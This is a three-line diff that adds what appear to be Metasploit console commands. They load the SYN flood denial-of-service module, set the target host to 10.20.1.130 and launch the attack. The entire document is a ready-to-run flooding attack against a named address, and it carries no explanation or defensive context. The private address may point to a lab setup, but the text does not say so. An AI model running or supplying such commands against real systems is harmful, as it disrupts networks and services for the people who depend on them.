@@ -1,0 +1,3 @@
+use auxiliary/dos/tcp/synflood
+set RHOST 10.20.1.130
+exploit
